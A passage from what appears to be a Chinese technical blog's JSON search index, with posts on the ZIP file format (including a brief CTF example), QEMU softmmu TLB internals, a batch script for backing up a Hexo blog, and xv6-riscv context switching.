&#125;&#125;","categories":["操作系统"],"tags":["操作系统","经验","QEMU"]},{"title":"ZIP格式分析","url":"/2021/08/29/ZIP%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/","content":"最近遇到一道CTF题是和zip格式编码相关的，正好我一直以来就对各文件格式编码没有一个系统的认知，就趁这个机会好好学习一下。\n简介\nZIP文件格式是一种数据压缩和文档储存的文件格式，原名Deflate，发明者为菲尔·卡茨（Phil Katz），他于1989年1月公布了该格式的资料。ZIP通常使用后缀名“.zip”，它的MIME格式为application/zip。当前，ZIP格式属于几种主流的压缩格式之一，其竞争者包括RAR格式以及开放源码的7z格式。从性能上比较，RAR及7z格式较ZIP格式压缩率较高，而7-Zip由于提供了免费的压缩工具而逐渐在更多的领域得到应用。Microsoft从Windows ME操作系统开始内置对zip格式的支持，即使用户的计算机上没有安装解压缩软件，也能打开和制作zip格式的压缩文件，OS X和流行的Linux操作系统也对zip格式提供了类似的支持。因此如果在网络上传播和分发文件，zip格式往往是最常用的选择。\n\n官方文档如果想要准确系统的了解整个zip格式，最好还是查看官方文档，链接如下：\n.ZIP File Format Specification\n格式分析根据官方文档，我们可以得知，一个标准的zip格式文件由以下结构组成：\n[local file header 1][file data 1][data descriptor 1]. ..[local file header n][file data n][data descriptor n][archive decryption header] (EFS)[archive extra data record] (EFS)[central directory][zip64 end of central directory record][zip64 end of central directory locator] [end of central directory record]\n在这里我们只考虑 local file header + file data + data descriptor + central directory + end of central directory record.\n文件头(Local file header)local file header signature     4 bytes  (0x04034b50)version needed to extract       2 bytesgeneral purpose bit flag        2 bytescompression method              2 byteslast mod file time              2 byteslast mod file date              2 bytescrc-32                          4 bytescompressed size                 4 bytesuncompressed size               4 bytesfile name length                2 bytesextra field length              2 bytesfile name (variable size)extra field (variable size)\n为了演示的方便，以下我们以一个包含了文本内容为26个英文字母的文本文件的压缩包做对照分析。\n\n\n文件头位置即为灰色区域，首先是本地文件头标识位(local file header signature)，值为固定的0x04034b50（需要注意的是单个字节数据在内存中的存储是低位在前，高位在后）。\n解压文件所需pkware的最低版本(version needed to extract)：0x000a，一般不需要考虑。\n通用比特标志位(general purpose bit flag)：0x0000，通常只需要考虑当bit 0为1时表示文件被加密。\n压缩方式(compression method)：0x0000，当值为：0x0000时表示无压缩。\n文件最后修改时间(last mod file time)：0x4e5a，以standard MS-DOS格式编码。 \n文件最后修改日期(last mod file date)：0x531d，同上。\nCRC32校验码(crc-32)：0x4c2750bd.\n压缩后大小(compressed size)：0x0000001a，单位为byte，由此我们可以推断出标准ZIP格式最大压缩容量为：16^8 - 1 bytes ≈ 4 GB，而ZIP64格式最大压缩容量为 2^64 - 1 bytes ≈ 16EB。\n未压缩的大小(uncompressed size)：0x0000001a，可见该文件并没有被压缩，这也与压缩方式为0x0000相吻合。\n文件名长度(file name length)：0x0008.\n扩展区长度(extra field length)：0x0000.\n文件名(file name)：0x7478742e74736574.\n扩展区(extra field)：无\n\n文件数据(File data)存储被压缩文件的数据：本例中即为26个英文字母，图中的黑色区域。\n数据描述符(Data descriptor)crc-32                          4 bytes      compressed size                 4 bytes      uncompressed size               4 bytes\n该区域只有在文件头的通用比特标志位的第3位(0x0008)为1时才存在，紧跟在压缩文件的数据区之后，只用在不能对输出的 ZIP 文件进行检索时使用。\n核心目录(Central directory)[file header 1]... [file header n][digital signature] \n文件头(File header)central file header signature   4 bytes  (0x02014b50)      version made by                 2 bytes      version needed to extract       2 bytes      general purpose bit flag        2 bytes      compression method              2 bytes      last mod file time              2 bytes      last mod file date              2 bytes      crc-32                          4 bytes      compressed size                 4 bytes      uncompressed size               4 bytes      file name length                2 bytes      extra field length              2 bytes      file comment length             2 bytes      disk number start               2 bytes      internal file attributes        2 bytes      external file attributes        4 bytes      relative offset of local header 4 bytes      file name (variable size)      extra field (variable size)      file comment (variable size)\n\n核心文件头标识位(central file header signature)：0x02014b50，为固定数值。\n压缩所用pkware版本(version mad by)：0x003f.\n解压所需的pkware最低版本(version needed to extract)：0x000a.\n通用比特标志位(general purpose bit flag)：0x0000.\n压缩方式(compression method)：0x0000.\n文件最后修改时间(last mod file time)：0x4e5a.\n文件最后修改日期(last mod file date)：0x531d.\nCRC32校验码(crc-32)：0x4c2750bd.\n压缩后大小(compressed size)：0x0000001a.\n未压缩的大小(uncompressed size)：0x0000001a.\n文件名长度(file name length)：0x0008.\n扩展区长度(extra field length)：0x0024.\n文件注释长度(file comment length)：0x0000.\n文件开始位置的磁盘编号(disk number start)：0x0000.\n内部文件属性(internal file attributes)：0x0000.\n外部文件属性(external file attributes)：0x00000002，外部属性的映射取决于主机系统，对于MS-DOS，低位字节是MS-DOS目录属性字节，如果输入来自于标准输入，该区域置为零。\n本地文件头的相互偏移(relative offset of local header)：0x00000000.\n文件名(file name)：0x7478742e74736574.\n扩展区(extra field)：即文件名后的36个字节数据。\n文件注释(file comment)：无\n\n数字签名(Digital signature)header signature                4 bytes  (0x05054b50)      size of data                    2 bytes      signature data (variable size)\n本区域不是必须的，在此不多赘述，感兴趣可以查看官方文档。\n目录结束标识(End of central directory record)end of central dir signature    4 bytes  (0x06054b50)      number of this disk             2 bytes      number of the disk with the      start of the central directory  2 bytes      total number of entries in the      central directory on this disk  2 bytes      total number of entries in      the central directory           2 bytes      size of the central directory   4 bytes      offset of start of central      directory with respect to      the starting disk number        4 bytes      .ZIP file comment length        2 bytes      .ZIP file comment       (variable size)\n\n核心目录结束标识位(end of central dir signature)：0x06054b50，为固定数值。\n该磁盘编号(number of this disk)：0x0000.\n核心目录开始位置的磁盘编号(number of the disk with the start of the central directory)：0x0000.\n该磁盘所记录的核心目录总数(total number of entries in the central directory on this disk)：0x0001.\n核心目录结构总数(total number of entries in the central directory on this disk)：0x0001.\n核心目录大小(size of the central directory)：0x0000005a.\n核心目录开始位置相较于起始磁盘号的偏移量(offset of start of central directory with respect to the starting disk number)：0x00000040.\nZIP文件注释长度(.ZIP file comment length)：0x0000.\nZIP文件注释(.ZIP file comment)：无\n\n例题题目链接你猜猜\n分析与解答由于对ZIP格式编码不熟悉，刚看到这一串字符以为是某种加密方式，在学习过本文后在看，很明显504B0304为ZIP格式的文件头标识位，因此我们打开010Editor，导入这一串16进制编码，并保存为ZIP格式。解压时发现设置了密码，考虑密码应该不会太复杂，直接暴力破解得到结果。\n","categories":["计算机基础"],"tags":["CTF","信息安全","文件","编码格式"]},{"title":"QEMU softmmu模型","url":"/2025/09/01/QEMU%20softmmu%E6%A8%A1%E5%9E%8B/","content":"本文将分析 QEMU TCG 模式下的访存模型，也就是 softmmu 的设计，基于的版本为 QEMU 6.2，架构则以 RISC-V 为例。\n\n基本调用链1. target/riscv/translate.c 访存指令翻译。2. accel/tcg/cputlb.c 调用 helper 加载函数（如 helper_le_ldq_mmu）。3. 调用 load_helper 函数\t1. 查 TLB，若未命中，则 tlb_fill 进行填充。\t2. 处理各种特殊情况（MMIO、不对界访问等）。\t3. 计算得到对应的宿主机虚拟地址 haddr = addr + entry-&gt;addend，并根据字长进行访问。\nTLB 数据结构QEMU 的 softmmu 模型的核心数据结构为其 TLB 的设计，结构如下：\nCPUTLBtypedef struct CPUTLB &#123;    CPUTLBCommon c;  // 存储 TLB 的一系列元数据。    CPUTLBDesc d[NB_MMU_MODES];  // 慢速（二级） TLB，主要用于存储从一级 TLB 中被驱逐（evict）出的条目。    CPUTLBDescFast f[NB_MMU_MODES];  // 快速（一级） TLB，用于快速完成地址转换。&#125; CPUTLB;\nCPUTLBDesctypedef struct CPUTLBDesc &#123;    /* 大页处理相关 */    target_ulong large_page_addr;    target_ulong large_page_mask;        /* 与 TLB 动态调整相关 */    int64_t window_begin_ns;    size_t window_max_entries;    size_t n_used_entries;       \t/* vTLB 中表中使用的下一个索引 */    size_t vindex;    /* 二级 TLB（vTLB） 和二级 IOTLB（vIOTLB） */    CPUTLBEntry vtable[CPU_VTLB_SIZE];    CPUIOTLBEntry viotlb[CPU_VTLB_SIZE];    /* 一级 IOTLB，与 IOMMU 相关（不太了解） */    CPUIOTLBEntry *iotlb;&#125; CPUTLBDesc;\nCPUTLBDescFasttypedef struct CPUTLBDescFast &#123;    uintptr_t mask;  // 用于完成 (address, mmu_idx) -&gt; TLB_index 的映射    CPUTLBEntry *table;  // 一级 TLB 表&#125; CPUTLBDescFast QEMU_ALIGNED(2 * sizeof(void *));\nCPUTLBEntrytypedef struct CPUTLBEntry &#123;    union &#123;        struct &#123;            /* 用于与 address 对比判断是否命中 */            target_ulong addr_read;            target_ulong addr_write;            target_ulong addr_code;            /* 宿主机虚拟地址 haddr 与模拟器虚拟地址 address 的偏移量，用于地址转换 */            uintptr_t addend;        &#125;;        uint8_t dummy[1 &lt;&lt; CPU_TLB_ENTRY_BITS];    &#125;;&#125; CPUTLBEntry;\n这里为读、写、执行都分别设置一个地址字段，其实是一种空间换时间的策略。比如说一个页面（如地址为 addr）具有 可读可写但不可执行 的权限，那么在进行 TLB 填充时，字段 addr_read 和 addr_write 都会被赋上 addr 的值，而 addr_code 则为（无符号）-1。这样在后续进行 TLB 命中判定时，本次是什么访问方式就与哪个字段进行比对，那么自然，如果本次针对 addr 的访问是取址访问（执行），自然就会发生 TLB miss。\n这样的设计可以使得 TLB 命中判定仅由一条 cmp 指令来完成，而如果使用类似页表条目的设计方法，引入一些权限位来标识页面是否可读可写可执行，空间占用自然更少，但同时比对效率也更低。\n内存访问load_helperload_helper/store_helper 是 QEMU softmmu 访存的核心函数，作用是根据 addr 和访问类型来对指定的模拟器内存进行对应的读/写操作。本文只分析 load_helper，store_helper 的实现与其类似。\n/* * env: CPU 架构相关的状态寄存器集合 * addr: 要读取的模拟器目标虚拟地址 * oi: 内存操作索引（包含 Memop 和 mmu_idx） * retaddr: 调用者返回地址（用于异常处理） * op: 内存操作类型（大小、端序） * code_read: 标志（是取指还是数据访问） * full_load: 用于递归处理不对界/跨页 */static inline uint64_t QEMU_ALWAYS_INLINEload_helper(CPUArchState *env, target_ulong addr, MemOpIdx oi,            uintptr_t retaddr, MemOp op, bool code_read,            FullLoadHelper *full_load)&#123;    uintptr_t mmu_idx = get_mmuidx(oi);    uintptr_t index = tlb_index(env, mmu_idx, addr);    CPUTLBEntry *entry = tlb_entry(env, mmu_idx, addr);    target_ulong tlb_addr = code_read ? entry-&gt;addr_code : entry-&gt;addr_read;    const size_t tlb_off = code_read ?        offsetof(CPUTLBEntry, addr_code) : offsetof(CPUTLBEntry, addr_read);    const MMUAccessType access_type =        code_read ? MMU_INST_FETCH : MMU_DATA_LOAD;    unsigned a_bits = get_alignment_bits(get_memop(oi));    void *haddr;    uint64_t res;    size_t size = memop_size(op);    /* 处理架构相关的访存不对界异常 */    if (addr &amp; ((1 &lt;&lt; a_bits) - 1)) &#123;        cpu_unaligned_access(env_cpu(env), addr, access_type,                             mmu_idx, retaddr);    &#125;    /* 判断一级 TLB 是否命中  */    if (!tlb_hit(tlb_addr, addr)) &#123;        /*          * 判断二级 TLB 是否命中         * 若二级 TLB 命中，则将二级 TLB 中的条目与 addr 对应的一级 TLB         * 中的条目进行交换，此后 entry 将为正确的条目。         */        if (!victim_tlb_hit(env, mmu_idx, index, tlb_off,                            addr &amp; TARGET_PAGE_MASK)) &#123;            /* 若二级 TLB 未命中，则需要进行填充。 */            tlb_fill(env_cpu(env), addr, size,                     access_type, mmu_idx, retaddr);            index = tlb_index(env, mmu_idx, addr);            entry = tlb_entry(env, mmu_idx, addr);        &#125;        tlb_addr = code_read ? entry-&gt;addr_code : entry-&gt;addr_read;        tlb_addr &amp;= ~TLB_INVALID_MASK;    &#125;    /* 处理一些特殊情况（TLB 的 tlb_addr 的低位存储着一些属性位） */    if (unlikely(tlb_addr &amp; ~TARGET_PAGE_MASK)) &#123;        CPUIOTLBEntry *iotlbentry;        bool need_swap;        if ((addr &amp; (size - 1)) != 0) &#123;            goto do_unaligned_access;        &#125;        iotlbentry = &amp;env_tlb(env)-&gt;d[mmu_idx].iotlb[index];        /* 处理观测点访问  */        if (unlikely(tlb_addr &amp; TLB_WATCHPOINT)) &#123;            cpu_check_watchpoint(env_cpu(env), addr, size,                                 iotlbentry-&gt;attrs, BP_MEM_READ, retaddr);        &#125;        /* 判断是否需要端序交换 */        need_swap = size &gt; 1 &amp;&amp; (tlb_addr &amp; TLB_BSWAP);        /* 处理 I/O 访问 */        if (likely(tlb_addr &amp; TLB_MMIO)) &#123;            return io_readx(env, iotlbentry, mmu_idx, addr, retaddr,                            access_type, op ^ (need_swap * MO_BSWAP));        &#125;        haddr = (void *)((uintptr_t)addr + entry-&gt;addend);        /* 两个 load_memop 分开写便于编译器优化（不太懂） */        if (unlikely(need_swap)) &#123;            return load_memop(haddr, op ^ MO_BSWAP);        &#125;        return load_memop(haddr, op);    &#125;    /* 处理慢速的不对界访问 (横跨多个页面或者 I/O).  */    if (size &gt; 1        &amp;&amp; unlikely((addr &amp; ~TARGET_PAGE_MASK) + size - 1                    &gt;= TARGET_PAGE_SIZE)) &#123;        target_ulong addr1, addr2;        uint64_t r1, r2;        unsigned shift;    do_unaligned_access:        addr1 = addr &amp; ~((target_ulong)size - 1);        addr2 = addr1 + size;        r1 = full_load(env, addr1, oi, retaddr);        r2 = full_load(env, addr2, oi, retaddr);        shift = (addr &amp; (size - 1)) * 8;        if (memop_big_endian(op)) &#123;            res = (r1 &lt;&lt; shift) | (r2 &gt;&gt; ((size * 8) - shift));        &#125; else &#123;            res = (r1 &gt;&gt; shift) | (r2 &lt;&lt; ((size * 8) - shift));        &#125;        return res &amp; MAKE_64BIT_MASK(0, size * 8);    &#125;    /* 加上 TLB 条目的 addend 偏移量得到宿主机的虚拟地址 */    haddr = (void *)((uintptr_t)addr + entry-&gt;addend);    return load_memop(haddr, op);&#125;\nTLB 填充tlb_set_page/*  * cpu: CPU 数据结构 * vaddr: 虚拟地址 * paddr: 虚拟地址对应的物理地址 * attrs: 内存事务属性，通常为 UNSPECIFIED * prot: 访问权限（读/写/执行） * mmu_idx: 地址空间标识符 * size: 映射大小（支持大页） */void tlb_set_page_with_attrs(CPUState *cpu, target_ulong vaddr,                             hwaddr paddr, MemTxAttrs attrs, int prot,                             int mmu_idx, target_ulong size)&#123;    CPUArchState *env = cpu-&gt;env_ptr;    CPUTLB *tlb = env_tlb(env);    CPUTLBDesc *desc = &amp;tlb-&gt;d[mmu_idx];    MemoryRegionSection *section;    unsigned int index;    target_ulong address;    target_ulong write_address;    uintptr_t addend;    CPUTLBEntry *te, tn;    hwaddr iotlb, xlat, sz, paddr_page;    target_ulong vaddr_page;    int asidx = cpu_asidx_from_attrs(cpu, attrs);    int wp_flags;    bool is_ram, is_romd;    assert_cpu_is_self(cpu);    if (size &lt;= TARGET_PAGE_SIZE) &#123;        sz = TARGET_PAGE_SIZE;    &#125; else &#123;        /* 记录大页信息 */        tlb_add_large_page(env, mmu_idx, vaddr, size);        sz = size;    &#125;    vaddr_page = vaddr &amp; TARGET_PAGE_MASK;    paddr_page = paddr &amp; TARGET_PAGE_MASK;    /*     * 将物理内存区域转换为对应的内存区域 MemoryRegionSection     * 并获取内存区域的偏移量 xlat，实际可用大小 sz 和访问权限 prot     */    section = address_space_translate_for_iotlb(cpu, asidx, paddr_page,                                                &amp;xlat, &amp;sz, attrs, &amp;prot);    assert(sz &gt;= TARGET_PAGE_SIZE);    tlb_debug(&quot;vaddr=&quot; TARGET_FMT_lx &quot; paddr=0x&quot; TARGET_FMT_plx              &quot; prot=%x idx=%d\\n&quot;,              vaddr, paddr, prot, mmu_idx);    address = vaddr_page;    /* 映射小于页大小（奇怪的情况？） */    if (size &lt; TARGET_PAGE_SIZE) &#123;        /* 使得 TLB 条目无效化  */        address |= TLB_INVALID_MASK;    &#125;    if (attrs.byte_swap) &#123;        address |= TLB_BSWAP;    &#125;    is_ram = memory_region_is_ram(section-&gt;mr);    is_romd = memory_region_is_romd(section-&gt;mr);    if (is_ram || is_romd) &#123;        addend = (uintptr_t)memory_region_get_ram_ptr(section-&gt;mr) + xlat;    &#125; else &#123;        addend = 0;    &#125;    write_address = address;    if (is_ram) &#123;        iotlb = memory_region_get_ram_addr(section-&gt;mr) + xlat;        if (prot &amp; PAGE_WRITE) &#123;            if (section-&gt;readonly) &#123;                write_address |= TLB_DISCARD_WRITE;            &#125; else if (cpu_physical_memory_is_clean(iotlb)) &#123;                write_address |= TLB_NOTDIRTY;            &#125;        &#125;    &#125; else &#123;        iotlb = memory_region_section_get_iotlb(cpu, section) + xlat;        write_address |= TLB_MMIO;        if (!is_romd) &#123;            address = write_address;        &#125;    &#125;    /* 检测当前页面是否设置了监视点 */    wp_flags = cpu_watchpoint_address_matches(cpu, vaddr_page,                                              TARGET_PAGE_SIZE);    index = tlb_index(env, mmu_idx, vaddr_page);    te = tlb_entry(env, mmu_idx, vaddr_page);    qemu_spin_lock(&amp;tlb-&gt;c.lock);    /* 标记 TLB 为脏  */    tlb-&gt;c.dirty |= 1 &lt;&lt; mmu_idx;    /* 确保 vTLB 中没有 vaddr 的缓存 */    tlb_flush_vtlb_page_locked(env, mmu_idx, vaddr_page);    /*      * 如果对应 TLB 条目位置现已存在其他 vaddr 的条目，     * 则将其驱逐至 vTLB 中     */    if (!tlb_hit_page_anyprot(te, vaddr_page) &amp;&amp; !tlb_entry_is_empty(te)) &#123;        unsigned vidx = desc-&gt;vindex++ % CPU_VTLB_SIZE;        CPUTLBEntry *tv = &amp;desc-&gt;vtable[vidx];        copy_tlb_helper_locked(tv, te);        desc-&gt;viotlb[vidx] = desc-&gt;iotlb[index];        tlb_n_used_entries_dec(env, mmu_idx);    &#125;    desc-&gt;iotlb[index].addr = iotlb - vaddr_page;    desc-&gt;iotlb[index].attrs = attrs;    /* 设置 addend 字段，使得 vaddr_page + addend = haddr */    tn.addend = addend - vaddr_page;    /* 设置可读的条目 */    if (prot &amp; PAGE_READ) &#123;        tn.addr_read = address;        if (wp_flags &amp; BP_MEM_READ) &#123;            tn.addr_read |= TLB_WATCHPOINT;        &#125;    &#125; else &#123;        tn.addr_read = -1;    &#125;    /* 设置可执行的条目 */    if (prot &amp; PAGE_EXEC) &#123;        tn.addr_code = address;    &#125; else &#123;        tn.addr_code = -1;    &#125;    /* 设置可写的条目 */    tn.addr_write = -1;    if (prot &amp; PAGE_WRITE) &#123;        tn.addr_write = write_address;        if (prot &amp; PAGE_WRITE_INV) &#123;            tn.addr_write |= TLB_INVALID_MASK;        &#125;        if (wp_flags &amp; BP_MEM_WRITE) &#123;            tn.addr_write |= TLB_WATCHPOINT;        &#125;    &#125;    /* 更新 TLB 条目 */    copy_tlb_helper_locked(te, &amp;tn);    tlb_n_used_entries_inc(env, mmu_idx);    qemu_spin_unlock(&amp;tlb-&gt;c.lock);&#125;void tlb_set_page(CPUState *cpu, target_ulong vaddr,                  hwaddr paddr, int prot,                  int mmu_idx, target_ulong size)&#123;    tlb_set_page_with_attrs(cpu, vaddr, paddr, MEMTXATTRS_UNSPECIFIED,                            prot, mmu_idx, size);&#125;\n大页处理一个值得一提的内容是 QEMU TLB 对大页的处理，可能也是为了性能的权衡，QEMU 对此的策略就是不支持。\n当向 TLB 中填充页大小大于 TARGET_PAGE_SIZE 的条目时，QEMU 会调用 tlb_add_large_page 进行大页的记录，代码如下：\nstatic void tlb_add_large_page(CPUArchState *env, int mmu_idx,                               target_ulong vaddr, target_ulong size)&#123;    target_ulong lp_addr = env_tlb(env)-&gt;d[mmu_idx].large_page_addr;    target_ulong lp_mask = ~(size - 1);    if (lp_addr == (target_ulong)-1) &#123;        /* 此前未记录大页  */        lp_addr = vaddr;    &#125; else &#123;        /* 扩展已存在的大页来将新的区域包含进去 */        lp_mask &amp;= env_tlb(env)-&gt;d[mmu_idx].large_page_mask;        while (((lp_addr ^ vaddr) &amp; lp_mask) != 0) &#123;            lp_mask &lt;&lt;= 1;  // 扩大掩码直到覆盖新地址        &#125;    &#125;    env_tlb(env)-&gt;d[mmu_idx].large_page_addr = lp_addr &amp; lp_mask;    env_tlb(env)-&gt;d[mmu_idx].large_page_mask = lp_mask;&#125;\n它的基本逻辑就是将本次访存的地址和大小记录下来，如果先前已经记录过大页，那么则将其记录的掩码进行扩大，以覆盖本次记录的大页的范围。\n具体来说，对于一个 2MB 大页，它在进行 TLB 填充时，每次只会填一个 4KB 小页。但是在 Guest 系统层，它认为存在这么一个 2MB 的大页，因此在它想要无效化大页条目时，我们需要将单独进行填充的若干个小页条目全部无效化，为此 QEMU 采取了一种保守做法：直接将该 mmu_idx 下的所有的 TLB 条目全部刷新。代码如下：\nstatic void tlb_flush_page_locked(CPUArchState *env, int midx,                                  target_ulong page)&#123;    target_ulong lp_addr = env_tlb(env)-&gt;d[midx].large_page_addr;    target_ulong lp_mask = env_tlb(env)-&gt;d[midx].large_page_mask;    /* Check if we need to flush due to large pages.  */    if ((page &amp; lp_mask) == lp_addr) &#123;        tlb_debug(&quot;forcing full flush midx %d (&quot;                  TARGET_FMT_lx &quot;/&quot; TARGET_FMT_lx &quot;)\\n&quot;,                  midx, lp_addr, lp_mask);        tlb_flush_one_mmuidx_locked(env, midx, get_clock_realtime());    &#125; else &#123;        if (tlb_flush_entry_locked(tlb_entry(env, midx, page), page)) &#123;            tlb_n_used_entries_dec(env, midx);        &#125;        tlb_flush_vtlb_page_locked(env, midx, page);    &#125;&#125;\n参考资料\nqemu tlb实现分析 | Sherlock’s blog\nqemu tcg访存指令模拟 | Sherlock’s blog\nQEMU 的 softmmu 设计 | Deep Dark Fantasy\nQEMU softmmu 访存 helper 整理 | Deep Dark Fantasy\n\n","categories":["操作系统"],"tags":["操作系统","虚拟内存","QEMU"]},{"title":"hexo博客的备份与恢复","url":"/2021/08/25/hexo%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/","content":"为了防止误操作或计算机崩溃导致的博客源文件丢失，或满足我们更换电脑进行写作的需求，定期进行备份与恢复就显得很重要了。\n备份需备份的文件目录我们在进行备份时，并不需要将整个博客目录全部备份，只备份以下几个用户自定义的即可：scaffolds目录，source目录，themes目录，.gitignore文件，_config.yml文件，package.json文件，其他都是通用的。\n首先我们先来观察整个博客目录的结构：\n\n.deploy_git    本目录会在我们部署时生成，也就是github上保存的文件，无需备份。\n\nnode_modules    本目录包含了hexo博客依赖的模块，安装时自动生成，无需备份。\n\npublic    与.deploy_git类似，是编译后生成的文件静态网页文件，无需备份。\n\nscaffolds    保存了用户文章的模板，需要备份。\n\nsource    保存了用户文章的源文件，需要备份。\n\nthemes    保存了用户下载的主题文件与配置，需要备份。\n\n.gitignore    保存了推送到github时忽略的文件名，需要备份。\n\n_config.yml    保存了用户配置信息，需要备份。\n\ndb.json    保存了网页的数据文件，在编译生成静态网页时会自动更新，无需备份。\n\npackage.json    保存了依赖的模块列表，需要备份。\n\npackage-lock.json    保存了依赖的模块安装记录，无需备份。\n\n\n备份操作在了解了需要备份的文件后，就可以进行备份了，可以手动找到这些文件并将其拷贝出来，或者上传到云端，但这样无疑是比较麻烦的。复制这一重复性操作可以编写一个批处理脚本进行操作：\n@echo offecho d|xcopy &quot;scaffolds&quot; &quot;../Back-up/MyBlog/scaffolds&quot;  /E/I/Yecho d|xcopy &quot;source&quot; &quot;../Back-up/MyBlog/source&quot;  /E/I/Yecho d|xcopy &quot;themes&quot; &quot;../Back-up/MyBlog/themes&quot;  /E/I/Yecho f|xcopy &quot;.gitignore&quot; &quot;../Back-up/MyBlog/.gitignore&quot;  /E/I/Yecho f|xcopy &quot;_config.yml&quot; &quot;../Back-up/MyBlog/_config.yml&quot;  /E/I/Yecho f|xcopy &quot;package.json&quot; &quot;../Back-up/MyBlog/package.json&quot;  /E/I/Yecho 备份完成！pause\n使用xcopy命令来完成复制操作，格式为：xcopy  &lt;需拷贝的文件路径&gt;  &lt;拷贝后的文件路径&gt;，有时系统可能会无法判断路径是文件名还是目录名，在执行时会让用户进行输入选择，输入d是目录名，输入f是文件名。为了防止程序因此中断，我们可以使用管道命令：A | B，表示A命令输出的结果作为B命令的输入。\n这样我们便将需要备份的文件拷贝出来了，之后便可以保存在U盘或者上传云端，这里我选择直接将备份的文件夹拖入Onedrive中进行同步，一键操作，简单快捷。\n\n恢复如果电脑上已经安装了hexo博客，由于某些误操作只是想恢复到之前备份的状态的话，只需要将备份的那六个文件和目录覆盖当前博客相应的文件和目录即可。而如果想在其他电脑上恢复博客内容的话，需要进行如下操作：\n安装git bash和node.js安装后可以在cmd中输入git version，node -v，npm -v查看版本来检测是否成功安装。\n\n安装Hexo在cmd中输入npm install -g hexo-cli\n初始化Hexo在想要保存hexo目录的位置，右键打开git bash here（也可以cmd进入此目录），执行hexo init\n恢复备份文件将备份的六个文件和目录覆盖到当前博客目录，恢复操作完成，可以hexo g，hexo s进行检验。\n","categories":["经验"],"tags":["经验","博客","备份","批处理"]},{"title":"xv6-riscv 上下文切换代码分析","url":"/2025/07/12/xv6-riscv%20%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/","content":"由于最近的工作涉及到编写上下文切换跳板代码的需求，因此便想将 xv6 中与此相关的代码读一读，正好之前学习时对这一块也没有看得太仔细。\n\n系统初始化xv6 的 qemu 启动参数为 -kernel kernel/kernel -bios none，qemu 模拟器在启动时，pc 将自动跳转到预先设定的地址 0x80000000 处，而链接脚本 kernel.ld 已经将下列代码 entry.S 链接到了该地址，因此下列代码即模拟器启动后 CPU 执行的初始代码。\n这段代码的作用是为每个 CPU 核心开辟属于自己的栈空间，以便后续内核代码的执行。\n.section .text.global _entry_entry:        # stack0 在 start.c 中定义        # 每个 CPU 固定为 4KB 的内核栈大小        # sp = stack0 + (hartid * 4096)        la sp, stack0        li a0, 1024*4        csrr a1, mhartid        addi a1, a1, 1        mul a0, a0, a1        add sp, sp, a0\t\t# 跳转到 start.c 中的 start() 处进行初始化        call startspin:        j spin\n其中内核栈的基址 stack0 在 start.c 中定义，如下：\n// entry.S needs one stack per CPU.__attribute__ ((aligned (16))) char stack0[4096 * NCPU];\n如果 make qemu 编译并反汇编内核 ELF 文件，还可以通过 kernel.sym 看到该符号最终被链接的地址位置：\n...0000000080001988 proc_pagetable0000000080007910 stack00000000080002906 sys_sleep...\n进程切换xv6 进行进程切换的代码如下 swtch：\n# Context switch##   void swtch(struct context *old, struct context *new);# # Save current registers in old. Load from new.\t.globl swtchswtch:        sd ra, 0(a0)        sd sp, 8(a0)        sd s0, 16(a0)        sd s1, 24(a0)        sd s2, 32(a0)        sd s3, 40(a0)        sd s4, 48(a0)        sd s5, 56(a0)        sd s6, 64(a0)        sd s7, 72(a0)        sd s8, 80(a0)        sd s9, 88(a0)        sd s10, 96(a0)        sd s11, 104(a0)        ld ra, 0(a1)        ld sp, 8(a1)        ld s0, 16(a1)        ld s1, 24(a1)        ld s2, 32(a1)        ld s3, 40(a1)        ld s4, 48(a1)        ld s5, 56(a1)        ld s6, 64(a1)        ld s7, 72(a1)        ld s8, 80(a1)        ld s9, 88(a1)        ld s10, 96(a1)        ld s11, 104(a1)                ret\n可以看到逻辑比较简单，只是将当前的 CPU 寄存器状态保存入内核中的 context 结构体内，再从新的 context 结构体中恢复 CPU 寄存器状态。\n// Saved registers for kernel context switches.struct context &#123;  uint64 ra;  uint64 sp;  // callee-saved  uint64 s0;  uint64 s1;  uint64 s2;  uint64 s3;  uint64 s4;  uint64 s5;  uint64 s6;  uint64 s7;  uint64 s8;  uint64 s9;  uint64 s10;  uint64 s11;&#125;;\n需要保存和恢复的寄存器状态，首先肯定需要 ra（目标的代码处） 和 sp（栈指针），除此之外，上下文切换函数 swtch 作为一个函数调用，也需要遵循 RISC-V 的调用约定（calling convention），即被调用函数 swtch 需要对被调用者保存（callee-saved）寄存器进行保存。有关 calling convention 的内容，可以参考下面这篇文章：\n一起学RISC-V汇编第9讲之RISC-V ABI之寄存器使用约定 - sureZ_ok - 博客园\n内核态陷入当 xv6 在内核态下触发中断或异常时，将会自动跳转到下列 kernelvec 代码处，进行寄存器保存、跳转到内核陷入处理函数、恢复寄存器状态。\n.globl kerneltrap.globl kernelvec.align 4kernelvec:        # 开辟栈空间以保存寄存器状态        addi sp, sp, -256        # 保存 caller-saved 寄存器        sd ra, 0(sp)        sd sp, 8(sp)        sd gp, 16(sp)        sd tp, 24(sp)        sd t0, 32(sp)        sd t1, 40(sp)        sd t2, 48(sp)        sd a0, 72(sp)        sd a1, 80(sp)        sd a2, 88(sp)        sd a3, 96(sp)        sd a4, 104(sp)        sd a5, 112(sp)        sd a6, 120(sp)        sd a7, 128(sp)        sd t3, 216(sp)        sd t4, 224(sp)        sd t5, 232(sp)        sd t6, 240(sp)        # 调用 trap.c 中的处理函数 kerneltrap()        call kerneltrap        # 恢复寄存器状态        ld ra, 0(sp)        ld sp, 8(sp)        ld gp, 16(sp)        # 不恢复 tp 寄存器，因为可能在 kerneltrap 中被调度到其他的 CPU 核心上运行        ld t0, 32(sp)        ld t1, 40(sp)        ld t2, 48(sp)        ld a0, 72(sp)        ld a1, 80(sp)        ld a2, 88(sp)        ld a3, 96(sp)        ld a4, 104(sp)        ld a5, 112(sp)        ld a6, 120(sp)        ld a7, 128(sp)        ld t3, 216(sp)        ld t4, 224(sp)        ld t5, 232(sp)        ld t6, 240(sp)        addi sp, sp, 256        # 返回到内核先前的中断/异常的位置        sret\n用户态陷入当在用户态触发陷入时，会内核态陷入类似，自动跳转到下列 uservec 处。但存在一点区别：由于 xv6 采用了内核页表机制，即用户态和内核态的切换需要进行地址空间的切换，因此用户页表和内核页表都需要将下列代码段映射到地址空间中，xv6 将其放在虚拟地址空间的最高一页，名为 trampoline。\n#include &quot;riscv.h&quot;#include 